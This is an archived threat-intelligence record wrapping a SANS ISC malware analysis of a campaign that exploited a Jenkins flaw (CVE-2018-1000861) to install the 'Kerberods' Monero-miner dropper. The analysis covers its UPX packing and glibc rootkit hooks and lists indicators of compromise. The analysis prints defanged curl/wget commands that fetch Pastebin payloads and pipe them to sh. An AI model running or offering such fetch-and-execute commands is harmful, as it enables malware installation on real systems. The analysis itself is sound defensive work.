{
    "id": "9b814464-e709-4f40-b3c7-02051ce3baec",
    "created_at": "2023-01-12T15:01:58.931706Z",
    "updated_at": "2025-03-27T02:05:41.193688Z",
    "deleted_at": null,
    "sha1_hash": "651d960a03847ea80a065676dde3ca46f4ff2d2a",
    "title": "2019-05-07 - Vulnerable Apache Jenkins exploited in the wild",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:10Z",
    "file_modification_date": "2022-05-28T18:02:10Z",
    "file_size": 1264018,
    "plain_text": "# SANS ISC: Vulnerable Apache Jenkins exploited in the wild - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/Vulnerable+Apache+Jenkins+exploited+in+the+wild/24916](https://isc.sans.edu/forums/diary/Vulnerable+Apache+Jenkins+exploited+in+the+wild/24916)**\n\nVulnerable Apache Jenkins exploited in the wild\n\n\nAn ongoing malicious campaign is looking for vulnerable Apache Jenkins\ninstallations to deploy a Monero cryptominer. The dropper uses sophisticated\ntechniques to hide its presence on the system, to move laterally and to look for\nnew victims on the internet. It also downloads and runs the miner software – of\ncourse.\n\nThe exploited vulnerability, CVE-2018-1000861 [1], was published in\nDecember 2018. It affects Stapler Web framework used by Jenkins 2.153 and\nearlier. It may allow attackers to invoke methods on Java objects by accessing\ncrafted URLs.\n\nLooking for publicly available exploits for this vulnerability, I could find a\ndetailed proof of concept published early March this year.\n\nAfter analyzing the threat which attacked one of my honeypots, I created\nthe diagram shown in the picture below. Follow the numbers in blue to\nunderstand each step.\n\n\nRenato\n\n82 Posts\n\nISC Handler\nMay 7th 2019\n\n\n-----\n\n**Vulnerability Exploitation**\n\nIn the picture below, you can see the exploitation occurring.\n\nNotice that there is a base64 encoded content piped to bash for execution.\nDecoding this content, it was possible to see that this campaign is using\nPastebin as the C2:\n\n(curl -fsSL hxxps://pastebin[.]com/raw/wDBa7jCQ||wget -q -Ohxxps://pastebin[.]com/raw/wDBa7jCQ)|sh\n\nThe content of the paste ‘wDBa7jCQ’ is no longer available, but the content\nwas another paste:\n\n(curl -fsSL hxxps://pastebin[.]com/raw/D8E71JBJ||wget -q -Ohxxps://pastebin[.]com/raw/D8E71JBJ)|sed 's/\\r//'|sh\n\nThe content of ‘D8E71JBJ’ paste is no longer available also, but it was the\nshell script down in following images.\n\n\n-----\n\n**The Dropper**\n\nThe dropper named “Kerberods” (not “Kerberos” as the protocol) caught my\nattention due to the way it is packed and the way it acts if it has ‘root’\nprivileges on the machine.\n\nAfter analyzing the binary, I could see that the packer used was a custom\nversion of ‘UPX’. UPX is an open source software and there are many ways\nUPX can be modified to make it hard to unpack the file using regular UPX\nversion. There is a great presentation on this subject by @unixfreaxjp [2]\ncalled ‘Unpacking the non-unpackable’ which shows different forms to fix ELF\nheaders in order to unpack files.\n\nFortunately, in this case, the UPX customizations involved just the modification\nof the magic constant UPX_MAGIC_LE32 from 'UPX' to some other three\nletters. Thus, reverting it to UPX in different parts of the binary, it was possible\n\n\n-----\n\nto unpack the binary with the regular version of UPX.\n\n**The Glibc hooks**\n\nThe other interesting part is the way ‘Kerberods’ acts to persist and hide itself\nif has root privileges on the machine.\n\nIf it is the case, it drops, compiles and loads a library into the operating system\nthat hooks different functions of Glibc to modify its behavior. In other words, it\nacts like a rootkit.\n\nIn the image below it is possible to see that the function ‘open’ will now check\nfor some strings in the ‘pathname’ to act in a different way. The intention is to\navoid anyone (including root) to be able to open the binary ‘khugepageds’,\nwhich is the cryptominer, the ‘ld.so.preload’, which is the file that loads the\nmalicious library and the library ‘libpamcd.so’ itself.\n\nAnother hook, to show one more example, hides the network connection to the\nprivate mining pool and the scan for open Redis servers, as seen in the image\nbelow.\n\n\n-----\n\n**Indicators of Compromise (IOCs)**\n\n**Filesystem**\n\n74becf0d1621ba1f036025cddffc46d4236530d54d1f913a4d0ad488099913c8\nBab27f611518dc55b00b1a9287bdb8e059c4f4cc1607444f40e0c45d5842994f\n\n43a00e0dd57d110d1c88b18234185267ca2a79f8ae1905bef4ba225144c992d2\n\n**Network**\n\nSYSTEMTEN[.]ORG:51640\n\n[Thread locked Subscribe](https://isc.sans.edu/forums/diary/subscribe/24916/) May 7th 2019\n\n3 years ago\n\nWe had the same with an outdated confluence wiki already on 20190410. Jens\n\n6 Posts\n\n[Quote](https://isc.sans.edu/forums/diary/quote/42512) May 8th 2019\n\n3 years ago\n\n\n-----\n\nThis same malware/actor was infecting vulnerable Confluence servers, with\nthe same modus operandi.\n\n\nDomMcIntyreDeVitto\n\n45 Posts\n\n\n[Quote](https://isc.sans.edu/forums/diary/quote/42516) May 8th 2019\n\n3 years ago\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-07 - Vulnerable Apache Jenkins exploited in the wild.pdf"
    ],
    "report_names": [
        "2019-05-07 - Vulnerable Apache Jenkins exploited in the wild.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535718,
    "ts_updated_at": 1743041141,
    "ts_creation_date": 1653760930,
    "ts_modification_date": 1653760930,
    "files": {
        "pdf": "https://archive.orkl.eu/651d960a03847ea80a065676dde3ca46f4ff2d2a.pdf",
        "text": "https://archive.orkl.eu/651d960a03847ea80a065676dde3ca46f4ff2d2a.txt",
        "img": "https://archive.orkl.eu/651d960a03847ea80a065676dde3ca46f4ff2d2a.jpg"
    }
}